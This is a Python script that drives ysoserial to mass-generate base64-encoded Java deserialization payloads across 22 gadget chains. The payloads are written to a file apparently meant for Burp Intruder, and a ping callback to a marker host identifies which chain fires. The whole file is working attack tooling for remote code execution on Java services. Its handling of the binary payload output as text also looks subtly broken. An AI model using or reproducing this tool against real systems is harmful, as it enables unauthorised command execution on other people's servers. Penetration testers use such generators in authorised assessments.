import os
import base64
import argparse
import logging
 
PAYLOADS = [
    'BeanShell1', 'Clojure', 'CommonsBeanutils1',
    'CommonsCollections1', 'CommonsCollections2',
    'CommonsCollections3', 'CommonsCollections4',
    'CommonsCollections5', 'CommonsCollections6',
    'Groovy1', 'Hibernate1', 'Hibernate2',
    'JBossInterceptors1', 'JRMPClient', 'JSON1',
    'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1',
    'Myfaces1', 'ROME', 'Spring1', 'Spring2'
]
 
def generate_payloads(name, cmd):
    for payload in PAYLOADS:
        final_cmd = cmd.replace('REPLACE', payload)
        logging.info(f"Generating {payload} for {name} using command: {final_cmd}")
        try:
            output = os.popen(f'java -jar ysoserial-all.jar {payload} "{final_cmd}"').read()
        except Exception as e:
            logging.error(f"Failed to generate payload for {payload}: {e}")
            continue
        encoded_output = base64.b64encode(output.encode()).decode()
        if encoded_output:
            with open(f"{name}_intruder.txt", "a") as f:
                f.write(f"{encoded_output}\n\n")
 
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("name", choices=["Windows", "Linux"], help="Name of the operating system")
    parser.add_argument("cmd", help='Command to be executed  Use : Windows "ping -n 1 win.REPLACE.server.local"')
    args = parser.parse_args()
 
    logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
 
    generate_payloads(args.name, args.cmd)
